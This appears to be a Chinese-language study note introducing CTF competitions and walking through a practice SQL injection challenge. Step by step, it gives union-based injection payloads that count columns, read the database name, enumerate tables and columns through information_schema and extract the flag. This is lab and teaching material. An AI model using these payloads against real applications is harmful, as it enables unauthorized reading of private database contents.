---
slug: /net-security/10/09
---

**CTP**（Capture the Flag），中文称“夺旗赛”，安全人员之间进行技术竞争的一种比赛。



比赛形式：

1. 理论赛
2. 夺旗赛：Crypto（编码）、Web（渗透）、MISC（杂项）、Reverse（逆向）、PMW
3. AWD 网络攻防赛（团队赛、混战）
4. CFS 网络攻防赛（团队赛、综合靶场）



常见 CTF 题目：[https://www.ctfhub.com](https://www.ctfhub.com)

### SQL 注入

![](http://img.wukaipeng.com/2023/12/15-080046-IOW1OG-image-20231215080045546.png)

![](http://img.wukaipeng.com/2023/12/15-080106-gmml1U-image-20231215080106026.png)

![](http://img.wukaipeng.com/2023/12/15-080120-h1ksHf-image-20231215080120156.png)

我们使用联合注入的方式：

1️⃣ 判断列数、显示位

输入 `1' order by 2#` 回显，而输入 `1' order by 3#` 不回显，说明数据库查询了两列：

![](http://img.wukaipeng.com/2023/12/17-091506-aq3VSb-image-20231217091506257.png)

![](http://img.wukaipeng.com/2023/12/17-091530-0f5ljW-image-20231217091529991.png)

2️⃣ 获取目标数据库名

输入 `-1' union select database(),2 #` 获取数据库的名称为 `sqli`

![](http://img.wukaipeng.com/2023/12/17-091720-6uGnmk-image-20231217091720030.png)

3️⃣ 获取目标数据库的所有表名、字段名、字段中的数据

输入 `-1' union select group_concat(table_name),2 from information_schema.tables where 
table_schema='sqli' #`，获取得到表 `new` 和 `flag`

![](http://img.wukaipeng.com/2023/12/17-091801-9LpqBH-image-20231217091801810.png)

查找 `flag` 表，输入 `-1' union select group_concat(column_name) ,2 from information_schema.columns where 
table_name='flag' #` ，发现 `flag` 字段

![](http://img.wukaipeng.com/2023/12/17-091849-x8M8uD-image-20231217091849472.png)

输入 `-1' union select flag,2 from sqli.flag #`，最终得到 ctfflag

![](http://img.wukaipeng.com/2023/12/17-091938-jLwlOd-image-20231217091938107.png)









